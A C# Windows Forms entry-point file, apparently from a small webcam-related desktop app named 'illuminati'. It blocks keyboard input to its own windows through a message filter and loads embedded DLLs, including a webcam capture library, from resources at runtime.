using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using System.Reflection;
using System.IO;

namespace illuminati
{
    static class Program
    {
        public class MyFilter : IMessageFilter
        {

            public static bool SuppressKeys = false;

            private const int WM_KEYDOWN = 0x0100;
            private const int WM_KEYUP = 0x0101;

            public bool PreFilterMessage(ref Message m)
            {
                switch (m.Msg)
                {
                    case WM_KEYDOWN:
                    case WM_KEYUP:
                        if (MyFilter.SuppressKeys)
                            return true;
                        break;

                    default:
                        break;
                }
                return false;
            }

        }

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.AddMessageFilter(new MyFilter());
            MyFilter.SuppressKeys = !MyFilter.SuppressKeys;

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            AppDomain.CurrentDomain.AssemblyResolve += OnResolveAssembly;
            Application.Run(new Form1());
        }

        static System.Reflection.Assembly CurrentDomain_AssemblyResolve(object sender, ResolveEventArgs args)
        {
            try
            {
                using (var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("illuminati.Properties.Resources.WebCam_Capture.dll"))
                {
                    byte[] data = new byte[stream.Length];
                    stream.Read(data, 0, data.Length);
                    return Assembly.Load(data);
                }
            }
            catch (Exception)
            {
                return null;
            }
        }

        static Assembly OnResolveAssembly(object sender, ResolveEventArgs e)
        {
            var thisAssembly = Assembly.GetExecutingAssembly();

            var assemblyName = new AssemblyName(e.Name);
            var dllName = assemblyName.Name + ".dll";

            var resources = thisAssembly.GetManifestResourceNames().Where(s => s.EndsWith(dllName));

            if (resources.Any())
            {
                var resourceName = resources.First();

                using (var stream = thisAssembly.GetManifestResourceStream(resourceName))
                {
                    if (stream == null)
                    {
                        return null;
                    }

                    var block = new byte[stream.Length];

                    try
                    {
                        stream.Read(block, 0, block.Length);
                        return Assembly.Load(block);
                    }
                    catch (IOException)
                    {
                        return null;
                    }
                    catch (BadImageFormatException)
                    {
                        return null;
                    }
                }
            }
            return null;
        }
    }
}
